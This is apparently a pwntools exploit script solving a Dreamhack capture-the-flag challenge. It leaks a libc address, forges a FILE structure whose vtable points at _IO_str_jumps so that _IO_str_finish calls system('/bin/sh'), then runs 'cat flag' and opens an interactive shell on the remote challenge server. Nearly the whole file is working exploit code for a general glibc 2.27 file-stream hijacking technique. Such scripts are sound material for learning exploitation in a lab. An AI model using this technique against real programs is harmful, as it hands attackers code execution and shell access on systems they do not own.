#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 14492
HOST = "host1.dreamhack.games"
exe = context.binary = ELF('./iofile_vtable_check_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x00000000004008E8
            b* 0x00000000004008BF
            b* _IO_str_finish
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
fp = exe.sym.fp

# PAYLOAD
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
io_str_jumps = libc.sym._IO_str_jumps
log.info("io_str_jumps: " + hex(io_str_jumps))

payload = b''
payload = payload.ljust(0x38, b'\0') + p64(bin_sh) # _IO_buf_base
payload = payload.ljust(0x88, b'\0') + p64(0x601800) # _lock
payload = payload.ljust(0xd8, b'\0') + p64(io_str_jumps) # vtable
payload = payload.ljust(0xe8, b'\0') + p64(system) # check 0xe0
p.sendafter(b'Data: ', payload)
p.sendline(b'cat flag')

p.interactive()